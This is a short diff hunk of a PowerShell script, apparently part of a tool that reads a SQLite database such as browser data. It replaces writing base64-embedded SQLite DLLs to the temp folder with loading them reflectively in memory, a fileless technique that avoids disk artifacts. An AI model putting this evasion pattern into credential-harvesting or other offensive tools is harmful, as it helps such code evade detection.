@@ -60,20 +60,9 @@ if ([intptr]::Size -eq 8)
 
 Add-Type -AssemblyName System.Security
 
-$SQLitePath = "$([system.io.path]::GetTempPath())System.Data.SQLite.dll"
-$SQLiteInteropPath = "$([system.io.path]::GetTempPath())SQLite.Interop.dll"
+[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($SQLiterInterop)) | Out-Null
+[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($SystemDataSQLiteDLL)) | Out-Null
 
-[system.io.file]::WriteAllBytes(`
-    $SQLitePath,
-    [System.Convert]::FromBase64String($SystemDataSQLiteDLL)
-)
-
-[system.io.file]::WriteAllBytes(
-    $SQLiteInteropPath,
-    [System.Convert]::FromBase64String($SQLiterInterop)
-)
-
-[System.Reflection.Assembly]::LoadFile($SQLitePath) | Out-Null
 $conn = New-Object System.Data.Sqlite.SqliteConnection -ArgumentList "Data Source=$Path;"
 $conn.Open()
 
